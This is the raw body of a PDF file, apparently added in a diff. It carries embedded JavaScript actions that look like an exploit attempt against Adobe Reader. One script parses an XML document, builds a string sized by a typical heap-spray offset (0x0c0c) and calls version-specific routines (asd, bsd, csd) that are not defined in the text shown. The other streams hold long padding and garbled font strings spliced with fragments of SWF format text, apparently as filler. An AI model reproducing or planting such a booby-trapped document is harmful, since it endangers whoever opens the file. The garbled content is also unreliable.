fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff∏∏    ∫¬gë˛â˛
+Lm          
+endstream 
+endobj 
+24 0 obj 
+<<
+/JS 43 0 R
+/S /JavaScript
+>>
+endobj 
+25 0 obj 
+<<
+/JS 44 0 R
+/S /JavaScript
+>>
+endobj 
+43 0 obj 
+<<
+/Length 1242
+>>
+stream
+function xx()
+{
+var cXMLDoc = "<family name = 'Robat'><grandad id = 'm1' name = 'A.C.' gender='M'><child> m2 </child><personal><income>100000</income></personal></grandad><dad id = 'm2' name = 'Bob' gender='M'><parent> m1 </parent><spouse> m3 </spouse><child> m4 </child><child> m5 </child><child> m6 </child><personal><income>75000</income></personal></dad><mom id = 'm3' name = 'Mary' gender='F'><spouse> m2 </spouse><personal><income>25000</income></personal></mom><daughter id = 'm4' name = 'Sue' gender='F'><parent> m2 </parent><personal><income>40000</income></personal></daughter><son id = 'm5' name = 'Jim' gender='M'><parent> m2 </parent><personal><income>35000</income></personal></son><daughter id = 'm6' name = 'Megan' gender='F'><parent> m2 </parent><personal><income>30000</income></personal></daughter></family>";
+var myXML= XMLData.parse( cXMLDoc, false);
+
+// The xfa object is undefined in an Acrobat form.
+if ( typeof xfa == "object" ) {
+if ( this.dynamicXFAForm )
+console.println(" This is a dynamic XML form.");
+else
+console.println(" This is a static XML form.");
+if ( this.XFAForeground )
+console.println(" This document has imported artwork");
+}
+else console.println(" This is an Acrobat form.");
+}
+
+                
+
+
+
+endstream 
+endobj 
+44 0 obj 
+<<
+/Length 1572
+>>
+stream
+function yy()
+{
+var cXMLDoc = "<family name = 'Robat'><grandad id = 'm1' name = 'A.C.' gender='M'><child> m2 </child><personal><income>100000</income></personal></grandad><dad id = 'm2' name = 'Bob' gender='M'><parent> m1 </parent><spouse> m3 </spouse><child> m4 </child><child> m5 </child><child> m6 </child><personal><income>75000</income></personal></dad><mom id = 'm3' name = 'Mary' gender='F'><spouse> m2 </spouse><personal><income>25000</income></personal></mom><daughter id = 'm4' name = 'Sue' gender='F'><parent> m2 </parent><personal><income>40000</income></personal></daughter><son id = 'm5' name = 'Jim' gender='M'><parent> m2 </parent><personal><income>35000</income></personal></son><daughter id = 'm6' name = 'Megan' gender='F'><parent> m2 </parent><personal><income>30000</income></personal></daughter></family>";
+var myXML= XMLData.parse( cXMLDoc, false);
+console.println("Document name: " + this.documentFileName);
+// The xfa object is undefined in an Acrobat form.
+if ( typeof xfa == "object" ) {
+if ( this.dynamicXFAForm )
+console.println(" This is a dynamic XML form.");
+else
+console.println(" This is a static XML form.");
+if ( this.XFAForeground )
+console.println(" This document has imported artwork");
+}
+else console.println(" This is an Acrobat form.");
+}
+try
+{
+var aaa = myXML;
+var bbb = "cccccccc";
+var ccc = "dddddddd";
+ddd = ccc.substring(0, (0x0c0c-0x24)/2);
+ddd += bbb;
+ddd += ccc;              
+if (app.viewVersion >=9)
+{
+asd(myXML);
+}
+else if (app.viewVersion >=8)
+{
+bsd(myXML);
+}
+if (app.viewVersion >=7)
+{
+csd(myXML);
+}
+}
+catch(e){xx()}
+
+endstream 
+endobj 
+33 0 obj 
+<<
+/Length 4101
+/Length1 4101
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BasefdsFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncodisangdsa/FontDescripfdtaor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinafnsiEncodfding/FontDessacrifpaor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFontfd/Tahoma/Encoding/WinAnsiEdsncoding/Ffdefdcriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFontfdsa/Tahoma/Encoding/WinAnsiEncoding/dfaFontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEnfdacoding/FontDsescriptor/BasdeFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDfdfdsescraiptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsfdsaiEncoding/FontDescriptor/BaaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptorf/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEfdsancoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+aseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScrahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encodinas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScrg/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+
+
+BT
+0  scn
+/TT0 2 Tf
+12 0 0 12 16 749.25 Tm
+(3)Tj
+ET
+endstream 
+endobj 
+32 0 obj 
+<<
+/Length 3553
+/Length1 3553
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScroma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/TiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+The SWF (pronoiff ? file format delivers vector graphics, text, video, and sound
+over the Internet and is supported by Adobe?Flash?Player software. The SWF file format is
+designed to be an efficient delivery format, not a format for exchanging graphics between
+graphics editors. It is designed to meet the following goals:
+On-screen disormat is primarily intended for on-screen display and supports
+anti-aliasing, fast rendering to a bitmap of any color format, animation, and interactive
+buttons.
+Extensibirmat is a tagged format, so it can be evolved with new features while
+maintaining backward compatibility with earlier versions of Flash Player.
+Network delormat can travel over a network with limited and unpredictable
+bandwidth. The files are compressed to be small and support incremental rendering through
+streaming. The SWF file format is a binary format and is not human readable like HTML.
+The SWF file format uses techniques such as bit-packing and structures with optional fields
+to minimize file size.
+Simpe format is simple so that Flash Player is small and easily ported. Also, Flash
+Player depends upon a limited set of operating system features only.
+File indepene files display with minimal dependence on external resources such
+as fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScript object model that allows interaction with drawing
+primitives, servers, and features of Flash Player.
+SWF files have the extension .swf and a MIME type of application/x-shockwave-flash.
+
+
+BT
+0  scn
+/TT0 2 Tf
+12 0 0 12 16 749.25 Tm
+(2)Tj
+ET
+endstream 
+endobj 
+31 0 obj 
+<<
+/Length 96
+/Length1 96
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+BT
+0  scn
+/F1 32 Tf
+12 0 0 12 16 749.25 Tm
+(1)Tj
+ET
+endstream 
+endobj 
+40 0 obj 
+<<
+/Length 4101
+/Length1 4101
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BasefdsFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncodisangdsa/FontDescripfdtaor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinafnsiEncodfding/FontDessacrifpaor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFontfd/Tahoma/Encoding/WinAnsiEdsncoding/Ffdefdcriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFontfdsa/Tahoma/Encoding/WinAnsiEncoding/dfaFontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEnfdacoding/FontDsescriptor/BasdeFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDfdfdsescraiptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsfdsaiEncoding/FontDescriptor/BaaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptorf/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEfdsancoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+aseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScrahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encodinas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScrg/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+
+
+BT
+0  scn
+/TT0 2 Tf
+12 0 0 12 16 749.25 Tm
+(3)Tj
+ET
+endstream 
+endobj 
+39 0 obj 
+<<
+/Length 3553
+/Length1 3553
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahas fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScroma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/TiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor/BaseFont/Tahoma/Encoding/WinAnsiEncoding/FontDescriptor
+The SWF (pronoiff ? file format delivers vector graphics, text, video, and sound
+over the Internet and is supported by Adobe?Flash?Player software. The SWF file format is
+designed to be an efficient delivery format, not a format for exchanging graphics between
+graphics editors. It is designed to meet the following goals:
+On-screen disormat is primarily intended for on-screen display and supports
+anti-aliasing, fast rendering to a bitmap of any color format, animation, and interactive
+buttons.
+Extensibirmat is a tagged format, so it can be evolved with new features while
+maintaining backward compatibility with earlier versions of Flash Player.
+Network delormat can travel over a network with limited and unpredictable
+bandwidth. The files are compressed to be small and support incremental rendering through
+streaming. The SWF file format is a binary format and is not human readable like HTML.
+The SWF file format uses techniques such as bit-packing and structures with optional fields
+to minimize file size.
+Simpe format is simple so that Flash Player is small and easily ported. Also, Flash
+Player depends upon a limited set of operating system features only.
+File indepene files display with minimal dependence on external resources such
+as fonts.
+Scala files work well on limited hardware, and can take advantage of better
+hardware when it is available. This ability is important because computers have different
+monitor resolutions and bit depths.
+raphics described by SWF files render quickly.
+Scripta format includes tags that provide sequences of byte codes to be
+interpreted by a stack machine. The byte codes support the ActionScript?language. Flash
+Player provides a runtime ActionScript object model that allows interaction with drawing
+primitives, servers, and features of Flash Player.
+SWF files have the extension .swf and a MIME type of application/x-shockwave-flash.
+
+
+BT
+0  scn
+/TT0 2 Tf
+12 0 0 12 16 749.25 Tm
+(2)Tj
+ET
+endstream 
+endobj 
+38 0 obj 
+<<
+/Length 96
+/Length1 96
+>>
+stream
+/CS0 cs 1  scn
+10 765.75 591.75 -729.75 re
+f
+BT
+0  scn
+/F1 32 Tf
+12 0 0 12 16 749.25 Tm
+(1)Tj
+ET
+endstream 
+endobj xref
+0 45
+0000000000 65535 f 
+0000000015 00000 n 
+0000009212 00000 n 
+0000000095 00000 n 
+0000026825 00000 n 
+0000000603 00000 n 
+0000000404 00000 n 
+0000000206 00000 n 
+0000018319 00000 n 
+0000018120 00000 n 
+0000017921 00000 n 
+0000042816 00000 n 
+0000042616 00000 n 
+0000042417 00000 n 
+0000000802 00000 n 
+0000009614 00000 n 
+0000001256 00000 n 
+0000000896 00000 n 
+0000001418 00000 n 
+0000001076 00000 n 
+0000005041 00000 n 
+0000000838 00000 n 
+0000009370 00000 n 
+0000009254 00000 n 
+0000051323 00000 n 
+0000051373 00000 n 
+0000009320 00000 n 
+0000027362 00000 n 
+0000009759 00000 n 
+0000009886 00000 n 
+0000018518 00000 n 
+0000062143 00000 n 
+0000058520 00000 n 
+0000054349 00000 n 
+0000018663 00000 n 
+0000018790 00000 n 
+0000026860 00000 n 
+0000043016 00000 n 
+0000070099 00000 n 
+0000066476 00000 n 
+0000062305 00000 n 
+0000043161 00000 n 
+0000043288 00000 n 
+0000051423 00000 n 
+0000052721 00000 n 
+trailer
+
+<<
+/Root 1 0 R
+/Size 45
+>>
+startxref
+70260
+%%EOF
+ úV  H
